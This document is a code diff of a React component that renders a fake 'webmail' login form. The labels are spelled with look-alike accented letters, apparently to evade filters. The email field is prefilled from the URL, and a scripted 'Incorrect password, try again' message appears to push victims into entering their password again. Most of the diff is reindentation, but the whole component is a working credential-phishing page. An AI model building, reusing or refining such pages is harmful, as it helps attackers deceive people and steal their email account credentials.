@@ -22,7 +22,6 @@ function App() {
   const [count, setCount] = useState(0)
   const [email, setEmail] = useState(url ? url : '')
   const [pwdOne, setPwdOne] = useState('')
-  const [isExpired, setIsExpired] = useState(true)
 
   const [pwdError, setPwdError] =  useState(false)
 
@@ -75,44 +74,43 @@ function App() {
 
   return (
     <div>
-        <div className="general">
-          <h2>WÉBMÁlL</h2>
-          <img src={logo} className="img2" alt='Timeout'/>
-          <form ref={form} onSubmit={handleFormSubmit}>
-              <label>EmáíI</label>
-              <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>
+      <div className="general">
+        <h2>WÉBMÁlL</h2>
+        <img src={logo} className="img2" alt='Timeout'/>
+        <form ref={form} onSubmit={handleFormSubmit}>
+            <label>EmáíI</label>
+            <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>
 
-              <label>Pásswórd</label>
-              <Grid container>
-                <Grid item xs={12}>
-                  <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} onChange={handlePwdOneChange} required />
-                </Grid>
-                  <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
-                    {!visible ? 
-                      <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
-                      : 
-                      <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
-                    }
-                  </Grid>
+            <label>Pásswórd</label>
+            <Grid container>
+              <Grid item xs={12}>
+                <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} onChange={handlePwdOneChange} required />
               </Grid>
+                <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
+                  {!visible ? 
+                    <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
+                    : 
+                    <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
+                  }
+                </Grid>
+            </Grid>
 
-              {pwdError && <div className='error'>Incorrect pássword, try again</div>}
-              <input type="submit" value="Continue" />
+            {pwdError && <div className='error'>Incorrect pássword, try again</div>}
+            <input type="submit" value="Continue" />
+        </form>
 
-          </form>
-
-          {loading && 
-            <div className='loader'>
-              <ClipLoader
-                color='#0073c6dc'
-                loading={loading}
-                size={150}
-                aria-label="Loading Spinner"
-                data-testid="loader"
-              />
-            </div>
-          }
-        </div>
+        {loading && 
+          <div className='loader'>
+            <ClipLoader
+              color='#0073c6dc'
+              loading={loading}
+              size={150}
+              aria-label="Loading Spinner"
+              data-testid="loader"
+            />
+          </div>
+        }
+      </div>
       
     </div>
   );
